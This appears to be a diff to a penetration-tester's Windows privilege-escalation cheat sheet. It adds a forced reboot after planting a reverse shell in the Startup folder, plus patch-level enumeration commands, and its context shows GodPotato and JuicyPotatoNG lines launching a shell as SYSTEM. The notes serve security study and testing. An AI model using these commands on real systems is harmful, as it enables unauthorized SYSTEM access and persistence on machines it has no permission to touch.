@@ -263,7 +263,8 @@ icalcs <path>
 # startup applications can be found here
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
 
-# check if folder is writable and transfer a reverse shell to it
+# check if folder is writable and transfer a reverse shell to it, the reboot the system
+shutdown /r /t 0
 ```
 
 ## Insecure GUI Apps
@@ -274,12 +275,15 @@ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 file://c:/windows/system32/cmd.exe
 ```
 
-## Public Exploits
+## Public Exploits and Security Updates
 
 ```shell
 # enumerate the system
 systeminfo
+wmic qfe list
+Get-HotFix | Sort-Object -Property InstalledOn -Descending
 Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
+systeminfo | findstr /B /C:"KB"
 
 # find a public exploit
 searchsploit 'params'
@@ -327,9 +331,12 @@ whoami /priv
 - <https://github.com/itm4n/PrintSpoofer>
 
 ```shell
-#GodPotato
+# GodPotato
 GodPotato.exe -cmd "cmd /c whoami"
 GodPotato.exe -cmd "shell.exe"
+
+# get .NET version
+Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
 
 # JuicyPotatoNG
 JuicyPotatoNG.exe -t * -p "shell.exe" -a
